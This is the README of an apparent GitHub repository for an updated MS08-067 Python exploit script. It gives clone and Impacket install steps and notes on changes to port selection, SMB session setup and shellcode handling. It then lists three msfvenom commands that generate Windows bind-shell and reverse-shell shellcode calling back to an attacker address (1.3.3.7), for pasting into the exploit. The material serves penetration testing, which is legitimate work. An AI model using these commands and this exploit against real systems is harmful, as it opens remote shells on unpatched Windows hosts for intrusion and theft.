# MS08_067 Python Exploit Script - Updated 2018

This is an updated version of the super old MS08-067 Python exploit script.  It implements some fixes to allow easy exploitation on a wider range of configurations.

Cloned and edited from this repository:
https://github.com/jivoi/pentest/

## Installation / Usage on Kali

`git clone https://github.com/andyacer/ms08_067/`

**You'll need to update Kali's Impacket version to 0_9_17**
Here's the steps to do that:

```
git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
```

## Update Notes

- Added support for selecting a target port at the command line.  It seemed that only 445 was previously supported.
- Changed library calls to correctly establish a NetBIOS session for SMB transport
- Changed shellcode handling to allow for variable length shellcode. Just cut and paste into this source file.

## Generating Shellcode

Example msfvenom commands to generate shellcode.  Just paste these into the file which you'll edit after downloading.  'Cause you're an awesome hacker like that.

```
msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```



